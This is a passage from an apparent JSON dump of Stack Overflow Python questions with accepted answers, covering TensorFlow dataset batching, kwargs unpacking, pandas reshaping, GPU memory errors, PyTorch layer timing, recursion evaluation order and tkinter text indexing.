    "Body": "I'm playing around with tensorflow to become a bit more familiar with the overall workflow. To do this I thought I should start with creating a simple classifier for the well known Iris dataset.\nI load the dataset using:\nds = tfds.load('iris', split='train', shuffle_files=True, as_supervised=True)\n\nI use the following classifier:\nmodel = keras.Sequential([\n    keras.layers.Dense(10,activation=\"relu\"),\n    keras.layers.Dense(10,activation=\"relu\"),\n    keras.layers.Dense(3, activation=\"softmax\")\n])\n\nmodel.compile(\n    optimizer=tf.keras.optimizers.Adam(0.001),\n    loss=tf.keras.losses.SparseCategoricalCrossentropy(),\n    metrics=[tf.keras.metrics.SparseCategoricalAccuracy()],\n)\n\nI then try to fit the model using:\nmodel.fit(ds,batch_size=50, epochs=100)\n\nThis gives the following error:\nInput 0 of layer \"dense\" is incompatible with the layer: expected min_ndim=2, found ndim=1. Full shape received: (4,)\n\n    Call arguments received by layer \"sequential\" (type Sequential):\n      \u2022 inputs=tf.Tensor(shape=(4,), dtype=float32)\n      \u2022 training=True\n      \u2022 mask=None\n\nI also tried defining the model using the functional API(as this was my orignal goal to learn)\ninputs = keras.Input(shape=(4,), name='features')\n\nfirst_hidden = keras.layers.Dense(10, activation='relu')(inputs)\nsecond_hidden = keras.layers.Dense(10, activation=\"relu\")(first_hidden)\n\noutputs = keras.layers.Dense(3, activation='softmax')(second_hidden)\n\nmodel = keras.Model(inputs=inputs, outputs=outputs, name=\"test_iris_classification\")\n\nI now get the same error as before but this time with a warning:\nWARNING:tensorflow:Model was constructed with shape (None, 4) for input KerasTensor(type_spec=TensorSpec(shape=(None, 4), dtype=tf.float32, name='features'), name='features', description=\"created by layer 'features'\"), but it was called on an input with incompatible shape (4,).\n\nI suspect this is something quite fundamental that haven't understood but I have not been able to figure it out, despite several hours of googling.\nPS:\nI also tried to download the whole dataset from the UCI Machine Learning Repository as a CSV file.\nI read it in like this:\nds = pd.read_csv(\"iris.data\", header=None)\nlabels = []\nfor name in ds[4]:\n    if name == \"Iris-setosa\":\n        labels.append(0)\n    elif name == \"Iris-versicolor\":\n        labels.append(1)\n    elif name == \"Iris-virginica\":\n        labels.append(2)\n    else:\n        raise ValueError(f\"Name wrong name: {name}\")\nlabels = np.array(labels)\nfeatures = np.array(ds[[0,1,2,3]])\n\nAnd fit it like this:\nmodel.fit(features, labels,batch_size=50, epochs=100)\n\nAnd I'm able to fit the model to this dataset without any problems for both the sequential and the functional API. Which makes me suspect my misunderstanding has something to do with how the tensorflow_datasets works.\n",
    "AcceptedAnswerId": 73134765,
    "AcceptedAnswer": "Set the batch size when loading your data:\nimport tensorflow_datasets as tfds\nimport tensorflow as tf\n\nds = tfds.load('iris', split='train', shuffle_files=True, as_supervised=True, batch_size=10)\nmodel = tf.keras.Sequential([\n    tf.keras.layers.Dense(10,activation=\"relu\"),\n    tf.keras.layers.Dense(10,activation=\"relu\"),\n    tf.keras.layers.Dense(3, activation=\"softmax\")\n])\n\nmodel.compile(\n    optimizer=tf.keras.optimizers.Adam(0.001),\n    loss=tf.keras.losses.SparseCategoricalCrossentropy(),\n    metrics=[tf.keras.metrics.SparseCategoricalAccuracy()],\n)\nmodel.fit(ds, epochs=100)\n\nAlso regarding model.fit, the docs state:\n\nInteger or None. Number of samples per gradient update. If\nunspecified, batch_size will default to 32. Do not specify the\nbatch_size if your data is in the form of datasets, generators, or\nkeras.utils.Sequence instances (since they generate batches).\n\n"
}
{
    "Id": 72984800,
    "PostTypeId": 1,
    "Title": "Why does unpacking non-identifier strings work on a function call?",
    "Body": "I've noticed, to my surprise, that in a function call, I could unpack a dict with strings that weren't even valid python identifiers.\nIt's surprising to me since argument names must be identifiers, so allowing a function call to unpack a **kwargs that has non-identifiers, with no run time error, doesn't seem healthy (since it could bury problems deeper that where they actually occur).\nUnless there's an actual use to being able to do this, in which case my question becomes \"what would that use be?\".\nExample code\nConsider this function:\ndef foo(**kwargs):\n    first_key, first_val = next(iter(kwargs.items()))\n    print(f\"{first_key=}, {first_val=}\")\n    return kwargs\n\nThis shows that, within a function call, you can't unpack a dict that has has integer keys, which is EXPECTED.\n>>> t = foo(**{1: 2, 3: 4})\nTypeError                                 Traceback (most recent call last)\n...\nTypeError: foo() keywords must be strings\n\nWhat is really not expected, and surprising, is that you can, on the other hand, unpack a dict with string keys, even if these are not valid python identifiers:\n>>> t = foo(**{'not an identifier': 1, '12': 12, ',(*&$)': 100})\nfirst_key='not an identifier', first_val=1\n>>> t\n{'not an identifier': 1, '12': 12, ',(*&$)': 100}\n\n",
    "AcceptedAnswerId": 72985667,
    "AcceptedAnswer": "Looks like this is more of a kwargs issue than an unpacking issue. For example, one wouldn't run into the same issue with foo:\ndef foo(a, b):\n    print(a + b)\n\nfoo(**{\"a\": 3, \"b\": 2})\n# 5\n\nfoo(**{\"a\": 3, \"b\": 2, \"c\": 4})\n# TypeError: foo() got an unexpected keyword argument 'c'\n\nfoo(**{\"a\": 3, \"b\": 2, \"not valid\": 4})\n# TypeError: foo() got an unexpected keyword argument 'not valid'\n\nBut when kwargs is used, that flexibility comes with a price. It looks like the function first attempts to pop out and map all the named arguments and then passes the remaining items in a dict called kwargs. Since all keywords are strings (but all strings are not valid keywords), the first check is easy - keywords must be strings. Beyond that, it's up to the author to figure out what to do with remaining items in kwargs.\ndef bar(a, **kwargs):\n    print(locals())\n    \nbar(a=2)\n# {'a': 2, 'kwargs': {}}\n\nbar(**{\"a\": 3, \"b\": 2})\n# {'a': 3, 'kwargs': {'b': 2}}\n\nbar(**{\"a\": 3, \"b\": 2, \"c\": 4})\n# {'a': 3, 'kwargs': {'b': 2, 'c': 4}}\n\nbar(**{1: 3, 3: 4})\n# TypeError: keywords must be strings\n\nHaving said all that, there definitely is inconsistency but not a flaw. Some related discussions:\n\nSupporting (or not) invalid identifiers in **kwargs \nfeature: **kwargs allowing improperly named variables\n\n"
}
{
    "Id": 73635605,
    "PostTypeId": 1,
    "Title": "Combine multiple columns into one category column using the column names as value label",
    "Body": "I have this data\n   ID      A      B      C\n0   0   True  False  False\n1   1  False   True  False\n2   2  False  False   True\n\nAnd want to transform it into\n   ID group\n0   0     A\n1   1     B\n2   2     C\n\n\nI want to use the column names as value labels for the category column.\nThere is a maximum of only one True value per row.\n\nThis is the MWE\n#!/usr/bin/env python3\nimport pandas as pd\n\ndf = pd.DataFrame({\n    'ID': range(3),\n    'A': [True, False, False],\n    'B': [False, True, False],\n    'C': [False, False, True]\n})\n\nresult = pd.DataFrame({\n    'ID': range(3),\n    'group': ['A', 'B', 'C']\n})\nresult.group = result.group.astype('category')\n\nprint(df)\nprint(result)\n\nI could do df.apply(lambda row: ...magic.., axis=1). But isn't there a more elegant way with pandas' own tools?\n",
    "AcceptedAnswerId": 73635685,
    "AcceptedAnswer": "You can use melt then a lookup based on the column where the values are true to get the results you are expecting\ndf = df.melt(id_vars = 'ID', var_name = 'group')\ndf.loc[df['value'] == True][['ID', 'group']]\n\n"
}
{
    "Id": 73629154,
    "PostTypeId": 1,
    "Title": "Command Line stable diffusion runs out of GPU memory but GUI version doesn't",
    "Body": "I installed the GUI version of Stable Diffusion here. With it I was able to make 512 by 512 pixel images using my GeForce RTX 3070 GPU with 8 GB of memory:\n\nHowever when I try to do the same thing with the command line interface, I run out of memory:\nInput:\n>> C:\\SD\\stable-diffusion-main>python scripts/txt2img.py --prompt \"a close-up portrait of a cat by pablo picasso, vivid, abstract art, colorful, vibrant\" --plms --n_iter 3 --n_samples 1 --H 512 --W 512\nError:\nRuntimeError: CUDA out of memory. Tried to allocate 1024.00 MiB (GPU 0; 8.00 GiB total capacity; 6.13 GiB already allocated; 0 bytes free; 6.73 GiB reserved in total by PyTorch) If reserved memory is >> allocated memory try setting max_split_size_mb to avoid fragmentation.  See documentation for Memory Management and PYTORCH_CUDA_ALLOC_CONF\nIf I reduce the size of the image to 256 X 256, it gives a result, but obviously much lower quality.\nSo part 1 of my question is why do I run out of memory at 6.13 GiB when I have 8 GiB on the card, and part 2 is what does the GUI do differently to allow 512 by 512 output? Is there a setting I can change to reduce the load on the GPU?\nThanks a lot,\nAlex\n",
    "AcceptedAnswerId": 73642630,
    "AcceptedAnswer": "This might not be the only answer, but I solved it by using the optimized version here. If you already have the standard version installed, just copy the \"OptimizedSD\" folder into your existing folders, and then run the optimized txt2img script instead of the original:\n>> python optimizedSD/optimized_txt2img.py --prompt \"a close-up portrait of a cat by pablo picasso, vivid, abstract art, colorful, vibrant\" --H 512 --W 512 --seed 27 --n_iter 2 --n_samples 10 --ddim_steps 50\nIt's quite slow on my computer, but produces 512 X 512 images!\nThanks,\nAlex\n"
}
{
    "Id": 74290259,
    "PostTypeId": 1,
    "Title": "count the number of three way conversations in a group chat dataset using pandas",
    "Body": "I wanted to count the number of three way conversations that have occured in a dataset.\nA chat group_x can consist of multiple members.\nWhat is a three way conversation?\n\n1st way - red_x sends a message in the group_x.\n2nd way - green_x replies in the same group_x.\n3rd way - red_x sends a reply in the same group_x.\n\nThis can be called a three way conversation.\nThe sequence has to be exactly red_#, green_#, red_#.\nWhat is touchpoint?\n\nTouchpoint 1 - red_x's first message.\nTouchpoint 2 - green_x's first message.\nTouchpoint 3 - red_x's second message.\n\nCode to easily generate a sample dataset I'm working with.\nimport pandas as pd\nfrom pandas import Timestamp\n\nt1_df = pd.DataFrame({'from_red': [True, False, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, True, False, True], \n              'sent_time': [Timestamp('2021-05-01 06:26:00'), Timestamp('2021-05-04 10:35:00'), Timestamp('2021-05-07 12:16:00'), Timestamp('2021-05-07 12:16:00'), Timestamp('2021-05-09 13:39:00'), Timestamp('2021-05-11 10:02:00'), Timestamp('2021-05-12 13:10:00'), Timestamp('2021-05-12 13:10:00'), Timestamp('2021-05-13 09:46:00'), Timestamp('2021-05-13 22:30:00'), Timestamp('2021-05-14 14:14:00'), Timestamp('2021-05-14 17:08:00'), Timestamp('2021-06-01 09:22:00'), Timestamp('2021-06-01 21:26:00'), Timestamp('2021-06-03 20:19:00'), Timestamp('2021-06-03 20:19:00'), Timestamp('2021-06-09 07:24:00'), Timestamp('2021-05-01 06:44:00'), Timestamp('2021-05-01 08:01:00'), Timestamp('2021-05-01 08:09:00')], \n              'w_uid': ['w_000001', 'w_112681', 'w_002516', 'w_002514', 'w_004073', 'w_005349', 'w_006803', 'w_006804', 'w_008454', 'w_009373', 'w_010063', 'w_010957', 'w_066840', 'w_071471', 'w_081446', 'w_081445', 'w_106472', 'w_000002', 'w_111906', 'w_000003'], \n              'user_id': ['red_00001', 'green_0263', 'red_01071', 'red_01071', 'red_01552', 'red_01552', 'red_02282', 'red_02282', 'red_02600', 'red_02854', 'red_02854', 'red_02600', 'red_00001', 'red_09935', 'red_10592', 'red_10592', 'red_12292', 'red_00002', 'green_0001', 'red_00003'], \n              'group_id': [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1], \n              'touchpoint': [1, 2, 1, 3, 1, 3, 1, 3, 1, 1, 3, 3, 3, 1, 1, 3, 1, 1, 2, 1]}, \n                     columns = ['from_red', 'sent_time', 'w_uid', 'user_id', 'group_id', 'touchpoint'])\n\nt1_df['sent_time'] = pd.to_datetime(t1_df['sent_time'], format = \"%d-%m-%Y\")\nt1_df\n\nThe dataset looks like this:\n\n\n\n\nfrom_red\nsent_time\nw_uid\nuser_id\ngroup_id\ntouchpoint\n\n\n\n\nTrue\n2021-05-01 06:26:00\nw_000001\nred_00001\n0\n1\n\n\nFalse\n2021-05-04 10:35:00\nw_112681\ngreen_0263\n0\n2\n\n\nTrue\n2021-05-07 12:16:00\nw_002516\nred_01071\n0\n1\n\n\nTrue\n2021-05-07 12:16:00\nw_002514\nred_01071\n0\n3\n\n\nTrue\n2021-05-09 13:39:00\nw_004073\nred_01552\n0\n1\n\n\nTrue\n2021-05-11 10:02:00\nw_005349\nred_01552\n0\n3\n\n\nTrue\n2021-05-12 13:10:00\nw_006803\nred_02282\n0\n1\n\n\nTrue\n2021-05-12 13:10:00\nw_006804\nred_02282\n0\n3\n\n\nTrue\n2021-05-13 09:46:00\nw_008454\nred_02600\n0\n1\n\n\nTrue\n2021-05-13 22:30:00\nw_009373\nred_02854\n0\n1\n\n\nTrue\n2021-05-14 14:14:00\nw_010063\nred_02854\n0\n3\n\n\nTrue\n2021-05-14 17:08:00\nw_010957\nred_02600\n0\n3\n\n\nTrue\n2021-06-01 09:22:00\nw_066840\nred_00001\n0\n3\n\n\nTrue\n2021-06-01 21:26:00\nw_071471\nred_09935\n0\n1\n\n\nTrue\n2021-06-03 20:19:00\nw_081446\nred_10592\n0\n1\n\n\nTrue\n2021-06-03 20:19:00\nw_081445\nred_10592\n0\n3\n\n\nTrue\n2021-06-09 07:24:00\nw_106472\nred_12292\n0\n1\n\n\nTrue\n2021-05-01 06:44:00\nw_000002\nred_00002\n1\n1\n\n\nFalse\n2021-05-01 08:01:00\nw_111906\ngreen_0001\n1\n2\n\n\nTrue\n2021-05-01 08:09:00\nw_000003\nred_00003\n1\n1\n\n\n\n\nHere is what I have tried, but the query is taking too long. Is there a faster way to achieve the same?\ntest_df = pd.DataFrame()\nfor i in range(len(t1_df['sent_time'])-1):\n    if t1_df.query(f\"group_id == {i}\")['from_red'].nunique() == 2:\n        y = t1_df.query(f\"group_id == {i} & touchpoint == 2\").loc[:, ['sent_time']].values[0][0]\n        x = t1_df.query(f\"group_id == {i} & sent_time > @y & (touchpoint == 3)\").sort_values('sent_time')\n        test_df = pd.concat([test_df, x])\n        test_df.merge(x, how = \"outer\")\n        \n    else:\n        pass\n\ntest_df\n\n",
    "AcceptedAnswerId": 74401453,
    "AcceptedAnswer": "For me it's not clear how you define the \"three way conversation\". Within on group, if you have the input messages what option(s) do you consider as \"three way conversation\"? There are several options:\nInput  : red_0, red_2, green_0, red_1, red_0, red_2, red_1\nOption1:        red_2, green_0, red_1\nOption2: red_0,        green_0,        red_0\n   +   :        red_2, green_0,               red_2\n\nand many more. Your code example returns the second msg of a user when sent after green:\nOptionX:               green_0,         red_0\n   +   :               green_0,               red_2\n   +   :               green_0,                      red_1\n\nwithout keeping track if some red user sent a msg before green. Another question is, what happens if green is sending multiple times within one group.\nInput  : red_0, red_2, green_0, green_0, red_1, red_0, green_1, red_1\n\nBased on your description \"The sequence has to be exactly red_#, green_#, red_#.\" I guess, Option1 is what you are looking for and maybe that it's even independent from the color: color0_#, color1_#, color0_#. Correct me if I'm wrong ;).\nPrepare the DataFrame\nTo get the operation more generic, I would first prepare the DataFrame, e.g. extract the color of the user and get a integer represenation for the color\n# extract the user color and id\nt1_df[['color', 'id']] = t1_df.pop('user_id').str.split('_', expand=True)\n# get the dtypes right, also it is not needed here\nt1_df.id = t1_df.id.astype(int)\nt1_df.color = t1_df.color.astype('category')\n# get color as intager\nt1_df['color_as_int'] =pd.factorize(t1_df.color)[0]\n\nDetect the sequence color0_#, color1_#, color0_#\n# a three way conversation is where color_as_int is [...,a,b,a,...]\n# expressed as difference it's color_as_int.diff() is [...,c,-c,...]\n# get the difference with tracking the group, therefore first sort\nt1_df.sort_values(['group_id', 'sent_time'], inplace=True)\nd_color = t1_df.groupby(['group_id']).color_as_int.diff()\nm = (d_color != 0) & (d_color == -d_color.shift(-1))  # detect [...,c,-c,...]\n# count up for each three way conversation\nm[m] = m[m].cumsum()\nm = m.astype(int)\n\n# get the labels for the dataframe [...,a,b,a,...]\nt1_df['three_way_conversation'] = m + m.shift(1, fill_value=0) + m.shift(-1, fill_value=0)\n\nwhich returns and works for any color\ncolumns = ['sent_time', 'group_id', 'color', 'id', 'touchpoint']\nprint(t1_df.loc[t1_df['three_way_conversation']>0, columns])\n\n             sent_time  group_id  color    id  touchpoint\n0  2021-05-01 06:26:00         0    red     1           1\n1  2021-05-04 10:35:00         0  green   263           2\n2  2021-05-07 12:16:00         0    red  1071           1\n17 2021-05-01 06:44:00         1    red     2           1\n18 2021-05-01 08:01:00         1  green     1           2\n19 2021-05-01 08:09:00         1    red     3           1\n\nBonus\nwith the DataFrame preparation you can easily count the msg per color or user within a group or get the first and last time of a msg from a color or user. cumcount is faster as count and pd.merg() afterwards.\nt1_df['color_msg_count'] = t1_df.groupby(['group_id', 'color']).cumcount() + 1\nt1_df['user_msg_count'] = t1_df.groupby(['group_id', 'color', 'id']).cumcount() + 1\n\nt1_df['user_sent_time_min'] = t1_df.sort_values('sent_time').groupby(['group_id', 'color', 'id']).sent_time.cummin()\nt1_df['user_sent_time_max'] = t1_df.sort_values('sent_time', ascending=False).groupby(['group_id', 'color', 'id']).sent_time.cummax()\n\n"
}
{
    "Id": 72103359,
    "PostTypeId": 1,
    "Title": "Format a Jupyter notebook on save in VSCode",
    "Body": "I use black to automatically format all of my Python code whenever I save in VSCode. I'd like the same functionality, but within a Jupyter notebook in VSCode.\nThis answer shows how to right click and format a cell or a whole notebook from the right click context menu, or a keyboard shortcut. Can I make this happen on save instead?\nIt looks like there is an issue related to this, but it is over a year old.\nAre there any good workarounds? Maybe a way to set the format notebook option to the same keybinding as save?\nUPDATE:\nIf you like me want this functionality to be added please go to the issue and upvote it, the devs said they will need a bunch of upvotes before it's considered.\n",
    "AcceptedAnswerId": 73225286,
    "AcceptedAnswer": "This is not officially supported, but there could be workarounds.\nFrom janosh's reply on GitHub:\nThere is a setting editor.codeActionsOnSave but it doesn't allow running arbitrary shell commands (for security reasons?) so you'd need to install an extension like Run On Save and get it to call black path/to/file.ipynb on save events.\nSadly even that doesn't work right now since VS Code does not yet expose lifecycle events for notebooks. The issue to upvote for that is: Improve workspace API for Notebook lifecycle to support (at least) saving events\nIf both get implemented, you should be able to add this to your settings to auto-format Jupyter notebooks:\n\"emeraldwalk.runonsave\": {\n  \"commands\": [\n    {\n      \"match\": \"\\\\.ipynb$\",\n      \"cmd\": \"black ${file}\"\n    }\n  ]\n}\n\n"
}
{
    "Id": 72224866,
    "PostTypeId": 1,
    "Title": "How to get time taken for each layer in Pytorch?",
    "Body": "I want to know the inference time of a layer in Alexnet. This code measures the inference time of the first fully connected layer of Alexnet as the batch size changes. And I have a few questions about this.\n\nIs it possible to measure the inference time accurately with the following code?\nIs there a time difference because the CPU and GPU run separately?\nIs there a module used to measure layer inference time in Pytorch?\n\nGiven the following code:\nimport torch\nimport torch.optim as optim\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom torchvision import transforms\nimport time\nfrom tqdm import tqdm\n\n\nclass AlexNet(nn.Module):\n    def __init__(self):\n        super(AlexNet, self).__init__()\n\n        self.relu = nn.ReLU(inplace=True)\n        self.maxpool2D = nn.MaxPool2d(kernel_size=3, stride=2, padding=0)\n        self.adaptive_avg_polling = nn.AdaptiveAvgPool2d((6, 6))\n        self.dropout = nn.Dropout(p=0.5)\n\n        self.conv1 = nn.Conv2d(3, 64, kernel_size=11, stride=4, padding=2)\n        self.conv2 = nn.Conv2d(64, 192, kernel_size=5, padding=2)\n        self.conv3 = nn.Conv2d(192, 384, kernel_size=3, padding=1)\n        self.conv4 = nn.Conv2d(384, 256, kernel_size=3, padding=1)\n        self.conv5 = nn.Conv2d(256, 256, kernel_size=3, padding=1)\n        self.fc1 = nn.Linear(256 * 6 * 6, 4096)\n        self.fc2 = nn.Linear(4096, 4096)\n        self.fc3 = nn.Linear(4096, 1000)\n\n    def time(self, x):\n        x = self.maxpool2D(self.relu(self.conv1(x)))\n        x = self.maxpool2D(self.relu(self.conv2(x)))\n        x =                self.relu(self.conv3(x))\n        x =                self.relu(self.conv4(x))\n        x = self.maxpool2D(self.relu(self.conv5(x)))\n        x = self.adaptive_avg_polling(x)\n\n\n        x = x.view(x.size(0), -1)\n        x = self.dropout(x)\n\n        start1 = time.time()\n        x = self.fc1(x)\n        finish1 = time.time()\n\n        x = self.dropout(self.relu(x))\n        x = self.fc2(x)\n        x = self.relu(x)\n        x = self.fc3(x)\n\n        return finish1 - start1\n\n\n\ndef layer_time():\n     use_cuda = torch.cuda.is_available()\n     print(\"use_cuda : \", use_cuda)\n\n     FloatTensor = torch.cuda.FloatTensor if use_cuda else torch.FloatTensor\n     device= torch.device(\"cuda:0\" if use_cuda else \"cpu\")\n\n     net = AlexNet().to(device)\n\n     test_iter = 10000\n     batch_size = 1\n     for i in range(10):\n         X = torch.randn(size=(batch_size, 3, 227, 227)).type(FloatTensor)\n         s = 0.0\n         for i in tqdm(range(test_iter)):\n             s += net.time(X)\n         print(s)\n         batch_size *= 2\n\n\n layer_time()\n\n\n",
    "AcceptedAnswerId": 73269143,
    "AcceptedAnswer": "I found a way to measure inference time by studying the AMP document. Using this, the GPU and CPU are synchronized and the inference time can be measured accurately.\nimport torch, time, gc\n\n# Timing utilities\nstart_time = None\n\ndef start_timer():\n    global start_time\n    gc.collect()\n    torch.cuda.empty_cache()\n    torch.cuda.reset_max_memory_allocated()\n    torch.cuda.synchronize()\n    start_time = time.time()\n\ndef end_timer():\n    torch.cuda.synchronize()\n    end_time = time.time()\n    return end_time - start_time\n\nSo my code changes as follows:\nimport torch, time, gc\nfrom tqdm import tqdm\nimport torch.nn as nn\nimport torch\n\n# Timing utilities\nstart_time = None\n\ndef start_timer():\n    global start_time\n    gc.collect()\n    torch.cuda.empty_cache()\n    torch.cuda.reset_max_memory_allocated()\n    torch.cuda.synchronize()\n    start_time = time.time()\n\ndef end_timer():\n    torch.cuda.synchronize()\n    end_time = time.time()\n    return end_time - start_time\n\n\nclass AlexNet(nn.Module):\n    def __init__(self):\n        super(AlexNet, self).__init__()\n\n        self.relu = nn.ReLU(inplace=True)\n        self.maxpool2D = nn.MaxPool2d(kernel_size=3, stride=2, padding=0)\n        self.adaptive_avg_polling = nn.AdaptiveAvgPool2d((6, 6))\n        self.dropout = nn.Dropout(p=0.5)\n\n        self.conv1 = nn.Conv2d(3, 64, kernel_size=11, stride=4, padding=2)\n        self.conv2 = nn.Conv2d(64, 192, kernel_size=5, padding=2)\n        self.conv3 = nn.Conv2d(192, 384, kernel_size=3, padding=1)\n        self.conv4 = nn.Conv2d(384, 256, kernel_size=3, padding=1)\n        self.conv5 = nn.Conv2d(256, 256, kernel_size=3, padding=1)\n        self.fc1 = nn.Linear(256 * 6 * 6, 4096)\n        self.fc2 = nn.Linear(4096, 4096)\n        self.fc3 = nn.Linear(4096, 1000)\n\n    def time(self, x):\n        x = self.maxpool2D(self.relu(self.conv1(x)))\n        x = self.maxpool2D(self.relu(self.conv2(x)))\n        x =                self.relu(self.conv3(x))\n        x =                self.relu(self.conv4(x))\n        x = self.maxpool2D(self.relu(self.conv5(x)))\n        x = self.adaptive_avg_polling(x)\n\n\n        x = x.view(x.size(0), -1)\n        x = self.dropout(x)\n\n        # Check first linear layer inference time\n        start_timer()\n        x = self.fc1(x)\n        result = end_timer()\n\n        x = self.dropout(self.relu(x))\n        x = self.fc2(x)\n        x = self.relu(x)\n        x = self.fc3(x)\n\n        return result\n\n\ndef layer_time():\n     use_cuda = torch.cuda.is_available()\n     print(\"use_cuda : \", use_cuda)\n\n     FloatTensor = torch.cuda.FloatTensor if use_cuda else torch.FloatTensor\n     device= torch.device(\"cuda:0\" if use_cuda else \"cpu\")\n\n     net = AlexNet().to(device)\n\n     test_iter = 1000\n     batch_size = 1\n     for i in range(10):\n         X = torch.randn(size=(batch_size, 3, 227, 227)).type(FloatTensor)\n         s = 0.0\n         for i in tqdm(range(test_iter)):\n             s += net.time(X)\n         print(s)\n         batch_size *= 2\n\nlayer_time()\n\n"
}
{
    "Id": 73647685,
    "PostTypeId": 1,
    "Title": "Why does a temporary variable in Python change how this Pass-By-Sharing variable behaves?",
    "Body": "first-time questioner here so do highlight my mistakes.\nI was grinding some Leetcode and came across a behavior (not related to the problem) in Python I couldn't quite figure out nor google-out. It's especially difficult because I'm not sure if my lack of understanding is in:\n\nrecursion\nthe += operator in Python or variable assignment in general\nor Python's pass-by-sharing behavior\nor just something else entirely\n\nHere's the simplified code:\nclass Holder:\n    def __init__(self, val=0):\n         self.val = val\n\nclass Solution:\n    def runThis(self):\n        holder = Holder()\n        self.diveDeeper(holder, 5)\n        return \n        \n    def diveDeeper(self, holder, n):\n        if n==0:\n            return 1\n\n        # 1) Doesn't result in mutation\n        holder.val += self.diveDeeper(holder, n-1)\n\n        # 2) Also doesn't result in mutation\n        # holder.val = holder.val + self.diveDeeper(holder, n-1)\n\n        # 3) !! Results in mutations\n        # returnVal = self.diveDeeper(holder, n-1)\n        # holder.val += returnVal\n\n        print(holder.val)\n        return 1\n\na = Solution()\na.runThis()\n\nSo yeah my main source of confusion is how (1) and (3) look semantically identical to me but results in two completely different outcomes:\n================ RESTART: Case 1 ===============\n1\n1\n1\n1\n1\n>>> \n================ RESTART: Case 3 ===============\n\n1\n2\n3\n4\n5\n>>> \n\nFrom (2), it doesn't seem related to the += operator and for brevity, I haven't included the tens of variations I've tried but none of them have given me any leads so far. Would really appreciate any pointers in the right direction (especially in case I get blindsided in job interviews lmao)\nPS: In case this is relevant, I'm using Python 3.8.2\n",
    "AcceptedAnswerId": 73648204,
    "AcceptedAnswer": "In Python, if you have expression1() + expression2(), expression1() is evaluated first.\nSo 1 and 2 are really equivalent to:\nleft = holder.val\nright = self.diveDeeper(holder, n - 1)\nholder.val = left + right\n\nNow, holder.val is only ever modified after the recursive call, but you use the value from before the recursive call, which means that no matter the iteration, left == 0.\nYour solution 3 is equivalent to:\nright = self.diveDeeper(holder, n - 1)\nleft = holder.val\nholder.val = left + right\n\nSo the recursive call is made before left = holder.val is evaluated, which means left is now the result of the sum of the previous iteration.\nThis is why you have to be careful with mutable state, you got to understand the order of operations perfectly.\n"
}
{
    "Id": 74447766,
    "PostTypeId": 1,
    "Title": "Tkinter - Use characters/bytes offset as index for text widget",
    "Body": "I want to delete part of a text widget's content, using only character offset (or bytes if possible).\nI know how to do it for lines, words, etc. Looked around a lot of documentations:\n\nhttps://www.tcl.tk/man/tcl8.6/TkCmd/text.html#M24\nhttps://tkdocs.com/tutorial/text.html\nhttps://anzeljg.github.io/rin2/book2/2405/docs/tkinter/text-methods.html\nhttps://web.archive.org/web/20120112185338/http://effbot.org/tkinterbook/text.htm\n\nHere is an example mre:\nimport tkinter as tk\n\nroot = tk.Tk()\n\ntext = tk.Text(root)\n\ntxt = \"\"\"Lorem ipsum dolor sit amet, consectetur adipiscing elit.\nSuspendisse enim lorem, aliquam quis quam sit amet, pharetra porta lectus.\nNam commodo imperdiet sapien, in maximus nibh vestibulum nec.\nQuisque rutrum massa eget viverra viverra. Vivamus hendrerit ultricies nibh, ac tincidunt nibh eleifend a. Nulla in dolor consequat, fermentum quam quis, euismod dui.\nNam at gravida nisi. Cras ut varius odio, viverra molestie arcu.\n\nPellentesque scelerisque eros sit amet sollicitudin venenatis.\nProin fermentum vestibulum risus, quis suscipit velit rutrum id.\nPhasellus nisl justo, bibendum non dictum vel, fermentum quis ipsum.\nNunc rutrum nulla quam, ac pretium felis dictum in. Sed ut vestibulum risus, suscipit tempus enim.\nNunc a imperdiet augue.\nNullam iaculis consectetur sodales.\nPraesent neque turpis, accumsan ultricies diam in, fermentum semper nibh.\nNullam eget aliquet urna, at interdum odio. Nulla in mi elementum, finibus risus aliquam, sodales ante.\nAenean ut tristique urna, sit amet condimentum quam. Mauris ac mollis nisi.\nProin rhoncus, ex venenatis varius sollicitudin, urna nibh fringilla sapien, eu porttitor felis urna eu mi.\nAliquam aliquam metus non lobortis consequat.\nPellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Aenean id orci dui.\"\"\"\n\ntext.insert(tk.INSERT, txt)\n\n\ndef test_delete(event=None):\n    text.delete() # change this line here\n\ntext.pack(fill=\"both\", expand=1)\ntext.pack_propagate(0)\ntext.bind('', test_delete)\nroot.mainloop()\n\nIt display an example text inside a variable, inside a text widget. I use a single key binding to test some of the possible ways to do what I want on that piece of text.\nI tried a lot of things, both from the documentation(s) and my own desperation:\n\ntext.delete(0.X): where X is any number. I thought since lines were 1.0, maybe using 0.X would work on chars only. It only work with a single char, regardless of what X is (even with a big number).\ntext.delete(1.1, 1.3): This act on the same line, because I was trying to see if it would delete 3 chars in any direction on the same line. It delete 2 chars instead of 3, and it does so by omitting one char at the start of the first line, and delete 2 char after that.\ntext.delete(\"end - 9c\"): only work at the end (last line), and omit 7 chars starting from EOF, and then delete a single char after that.\ntext.delete(0.1, 0.2): Does not do anything. Same result for other 0.X, 0.X combination.\n\nExample of what I try to achieve:\nUsing the example text above would take too long, so let's consider a smaller string, say \"hello world\".\nNow let's say we use an index that start with 1 (doesn't matter but make things easier to explain), the first char is \"h\" and the last one is \"d\". So say I use chars range such as \"2-7\", that would be \"ello w\". Say I want to do \"1-8\"? -> \"hello wo\", and now starting from the end, \"11-2\", \"ello world\".\nThis is basically similar to what f.tell() and f.seek() do. I want to do something like that but using only the content inside of the text widget, and then do something on those bytes/chars ranges (in the example above, I'm deleting them, etc).\n",
    "AcceptedAnswerId": 74461805,
